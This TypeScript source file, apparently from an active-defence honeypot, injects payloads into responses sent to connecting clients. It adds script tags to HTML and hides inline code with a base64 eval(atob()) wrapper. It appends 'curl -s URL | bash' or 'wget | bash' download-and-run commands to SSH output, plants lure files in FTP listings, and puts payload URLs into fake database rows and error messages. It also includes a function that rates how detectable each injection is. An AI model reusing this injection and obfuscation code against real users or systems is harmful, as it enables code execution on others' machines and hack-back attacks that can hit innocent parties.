/**
 * Stinger Response Modifier
 *
 * Responsible for modifying honeypot responses to inject payloads.
 * Each protocol has its own injection strategy:
 * - HTTP/HTTPS: Inject JavaScript into HTML responses
 * - SSH: Inject bash commands into terminal prompts/output
 * - FTP: Inject payload files into directory listings
 * - Database: Inject payload into query results
 */

import type { ServiceType } from "../../../lib_deno/types.ts";
import { ServiceType as ST } from "../../../lib_deno/types.ts";

/**
 * Payload injection result
 */
export interface InjectionResult {
  modified: boolean;
  response: string | Uint8Array;
  injectionPoint?: string;
  originalSize: number;
  modifiedSize: number;
}

/**
 * Injection configuration
 */
export interface InjectionConfig {
  payloadUrl: string;
  payloadCode?: string;
  inline: boolean;
  stealthy: boolean;
  protocol: ServiceType;
  context?: Record<string, unknown>;
}

/**
 * Response Modifier - Protocol-specific payload injection
 */
export class ResponseModifier {
  /**
   * Modify a response to inject a payload
   */
  static inject(
    originalResponse: string | Uint8Array,
    config: InjectionConfig,
  ): InjectionResult {
    const originalSize = typeof originalResponse === "string"
      ? originalResponse.length
      : originalResponse.byteLength;

    let modified = false;
    let response: string | Uint8Array = originalResponse;
    let injectionPoint: string | undefined;

    // Convert to string if needed
    const responseStr = typeof originalResponse === "string"
      ? originalResponse
      : new TextDecoder().decode(originalResponse);

    // Protocol-specific injection
    switch (config.protocol) {
      case ST.HTTP:
      case ST.HTTPS:
        ({ modified, response, injectionPoint } = this.injectHTTP(responseStr, config));
        break;

      case ST.SSH:
        ({ modified, response, injectionPoint } = this.injectSSH(responseStr, config));
        break;

      case ST.FTP:
      case ST.SFTP:
        ({ modified, response, injectionPoint } = this.injectFTP(responseStr, config));
        break;

      case ST.PostgreSQL:
      case ST.MySQL:
      case ST.MongoDB:
        ({ modified, response, injectionPoint } = this.injectDatabase(responseStr, config));
        break;

      default:
        // Unknown protocol, return original
        response = originalResponse;
        modified = false;
    }

    const modifiedSize = typeof response === "string"
      ? response.length
      : response.byteLength;

    return {
      modified,
      response,
      injectionPoint,
      originalSize,
      modifiedSize,
    };
  }

  /**
   * Inject payload into HTTP response
   */
  private static injectHTTP(
    response: string,
    config: InjectionConfig,
  ): { modified: boolean; response: string; injectionPoint?: string } {
    // Check if response is HTML
    const isHTML = response.toLowerCase().includes("<html") ||
      response.toLowerCase().includes("<!doctype");

    if (!isHTML) {
      // Not HTML, can't inject
      return { modified: false, response };
    }

    let injectionPoint: string;
    let modifiedResponse: string;

    if (config.inline && config.payloadCode) {
      // Inject code inline
      const scriptTag = config.stealthy
        ? this.createStealthyScriptTag(config.payloadCode)
        : `<script>\n${config.payloadCode}\n</script>`;

      // Try to inject before </body>
      if (response.toLowerCase().includes("</body>")) {
        injectionPoint = "before_body_close";
        modifiedResponse = response.replace(
          /<\/body>/i,
          `${scriptTag}\n</body>`,
        );
      } // Try to inject before </head>
      else if (response.toLowerCase().includes("</head>")) {
        injectionPoint = "before_head_close";
        modifiedResponse = response.replace(
          /<\/head>/i,
          `${scriptTag}\n</head>`,
        );
      } // Append to end
      else {
        injectionPoint = "end_of_response";
        modifiedResponse = response + `\n${scriptTag}`;
      }
    } else {
      // Inject as external script reference
      const scriptTag = `<script src="${config.payloadUrl}"></script>`;

      if (response.toLowerCase().includes("</body>")) {
        injectionPoint = "before_body_close";
        modifiedResponse = response.replace(
          /<\/body>/i,
          `${scriptTag}\n</body>`,
        );
      } else if (response.toLowerCase().includes("</head>")) {
        injectionPoint = "before_head_close";
        modifiedResponse = response.replace(
          /<\/head>/i,
          `${scriptTag}\n</head>`,
        );
      } else {
        injectionPoint = "end_of_response";
        modifiedResponse = response + `\n${scriptTag}`;
      }
    }

    return {
      modified: true,
      response: modifiedResponse,
      injectionPoint,
    };
  }

  /**
   * Inject payload into SSH session
   */
  private static injectSSH(
    response: string,
    config: InjectionConfig,
  ): { modified: boolean; response: string; injectionPoint?: string } {
    // SSH payload injection strategies:
    // 1. Inject download command into command output
    // 2. Add to MOTD/banner
    // 3. Inject into prompt

    if (config.inline && config.payloadCode) {
      // Inject inline bash code
      const injectionPoint = "inline_command";
      const modifiedResponse = response + `\n# System check\n${config.payloadCode}\n`;
      return { modified: true, response: modifiedResponse, injectionPoint };
    } else {
      // Inject download command
      const downloadCmd = config.stealthy
        ? `curl -s ${config.payloadUrl} | bash`
        : `wget -qO- ${config.payloadUrl} | bash`;

      const injectionPoint = "download_command";
      const modifiedResponse = response + `\n${downloadCmd}\n`;
      return { modified: true, response: modifiedResponse, injectionPoint };
    }
  }

  /**
   * Inject payload into FTP response
   */
  private static injectFTP(
    response: string,
    config: InjectionConfig,
  ): { modified: boolean; response: string; injectionPoint?: string } {
    // FTP payload injection:
    // 1. Add malicious file to directory listing
    // 2. Inject into file content
    // 3. Modify welcome banner

    // Check if this is a directory listing (LIST command response)
    const isDirListing = response.includes("-rw-r--r--") ||
      response.includes("drwxr-xr-x");

    if (isDirListing) {
      // Add a fake file that contains the payload
      const timestamp = new Date().toISOString().split("T")[0];
      const fakeFile = config.stealthy
        ? `-rw-r--r-- 1 ftp ftp 4096 ${timestamp} .config`
        : `-rw-r--r-- 1 ftp ftp 2048 ${timestamp} README.txt`;

      const injectionPoint = "directory_listing";
      const modifiedResponse = response + `\n${fakeFile}\n`;
      return { modified: true, response: modifiedResponse, injectionPoint };
    }

    // If this is banner/welcome message
    if (response.startsWith("220")) {
      const injectionPoint = "welcome_banner";
      const modifiedResponse = response + `\n220 See NOTICE.txt for important information\n`;
      return { modified: true, response: modifiedResponse, injectionPoint };
    }

    return { modified: false, response };
  }

  /**
   * Inject payload into database response
   */
  private static injectDatabase(
    response: string,
    config: InjectionConfig,
  ): { modified: boolean; response: string; injectionPoint?: string } {
    // Database payload injection:
    // 1. Inject into query results (if attacker is selecting data)
    // 2. Inject into error messages
    // 3. Add fake stored procedures/functions

    // Check if response looks like query results
    const isQueryResult = response.includes("SELECT") ||
      response.includes("rows") ||
      response.includes("|");

    if (isQueryResult) {
      // Inject a fake row with payload URL
      const injectionPoint = "query_results";
      const fakeRow = config.stealthy
        ? `| debug_info | ${config.payloadUrl} |`
        : `| system_notice | Visit ${config.payloadUrl} for updates |`;

      const modifiedResponse = response + `\n${fakeRow}\n`;
      return { modified: true, response: modifiedResponse, injectionPoint };
    }

    // Inject into error messages
    if (response.toLowerCase().includes("error")) {
      const injectionPoint = "error_message";
      const errorAddition = `\nDiagnostic data: ${config.payloadUrl}`;
      const modifiedResponse = response + errorAddition;
      return { modified: true, response: modifiedResponse, injectionPoint };
    }

    return { modified: false, response };
  }

  /**
   * Create stealthy script tag with obfuscation
   */
  private static createStealthyScriptTag(code: string): string {
    // Wrap in IIFE and add some obfuscation
    const encoded = btoa(code);
    const obfuscatedCode = `(function(){eval(atob("${encoded}"))})();`;

    return `<script type="text/javascript">${obfuscatedCode}</script>`;
  }

  /**
   * Check if response is suitable for injection
   */
  static canInject(response: string | Uint8Array, protocol: ServiceType): boolean {
    const responseStr = typeof response === "string"
      ? response
      : new TextDecoder().decode(response);

    switch (protocol) {
      case ST.HTTP:
      case ST.HTTPS:
        // Check if HTML
        return responseStr.toLowerCase().includes("<html") ||
          responseStr.toLowerCase().includes("<!doctype");

      case ST.SSH:
        // SSH responses are always injectable (can append commands)
        return true;

      case ST.FTP:
      case ST.SFTP:
        // Check if directory listing or banner
        return responseStr.includes("-rw-r--r--") ||
          responseStr.startsWith("220");

      case ST.PostgreSQL:
      case ST.MySQL:
      case ST.MongoDB:
        // Database responses are injectable if they contain results
        return responseStr.includes("SELECT") ||
          responseStr.toLowerCase().includes("error");

      default:
        return false;
    }
  }

  /**
   * Estimate stealth level of injection
   */
  static estimateStealth(result: InjectionResult): "high" | "medium" | "low" {
    if (!result.modified) {
      return "high"; // No modification = most stealthy
    }

    const sizeIncrease = result.modifiedSize - result.originalSize;
    const percentIncrease = (sizeIncrease / result.originalSize) * 100;

    // If size increase is < 5%, considered stealthy
    if (percentIncrease < 5) {
      return "high";
    }

    // If size increase is < 20%, considered medium
    if (percentIncrease < 20) {
      return "medium";
    }

    // Large size increase = easily detected
    return "low";
  }

  /**
   * Create a decoy injection (fake payload for testing)
   */
  static createDecoy(protocol: ServiceType): InjectionConfig {
    const decoyUrl = "http://example.com/health-check.js";

    return {
      payloadUrl: decoyUrl,
      inline: false,
      stealthy: true,
      protocol,
      context: {
        decoy: true,
        description: "Harmless health check script for testing",
      },
    };
  }
}

/**
 * Batch modifier for processing multiple responses
 */
export class BatchModifier {
  private results: Map<string, InjectionResult> = new Map();

  /**
   * Process multiple responses
   */
  async processResponses(
    responses: Array<{ id: string; response: string | Uint8Array; config: InjectionConfig }>,
  ): Promise<Map<string, InjectionResult>> {
    for (const item of responses) {
      const result = ResponseModifier.inject(item.response, item.config);
      this.results.set(item.id, result);
    }

    return this.results;
  }

  /**
   * Get statistics
   */
  getStatistics(): {
    total: number;
    modified: number;
    unchanged: number;
    averageSizeIncrease: number;
  } {
    const results = Array.from(this.results.values());
    const modified = results.filter((r) => r.modified);

    const totalSizeIncrease = modified.reduce(
      (sum, r) => sum + (r.modifiedSize - r.originalSize),
      0,
    );

    return {
      total: results.length,
      modified: modified.length,
      unchanged: results.length - modified.length,
      averageSizeIncrease: modified.length > 0
        ? totalSizeIncrease / modified.length
        : 0,
    };
  }

  /**
   * Clear results
   */
  clear(): void {
    this.results.clear();
  }
}

/**
 * Injection strategy factory
 */
export class InjectionStrategy {
  /**
   * Create aggressive injection config
   */
  static aggressive(payloadUrl: string, protocol: ServiceType): InjectionConfig {
    return {
      payloadUrl,
      inline: false,
      stealthy: false,
      protocol,
      context: { strategy: "aggressive" },
    };
  }

  /**
   * Create stealthy injection config
   */
  static stealthy(payloadUrl: string, payloadCode: string, protocol: ServiceType): InjectionConfig {
    return {
      payloadUrl,
      payloadCode,
      inline: true,
      stealthy: true,
      protocol,
      context: { strategy: "stealthy" },
    };
  }

  /**
   * Create balanced injection config
   */
  static balanced(payloadUrl: string, protocol: ServiceType): InjectionConfig {
    return {
      payloadUrl,
      inline: false,
      stealthy: true,
      protocol,
      context: { strategy: "balanced" },
    };
  }
}
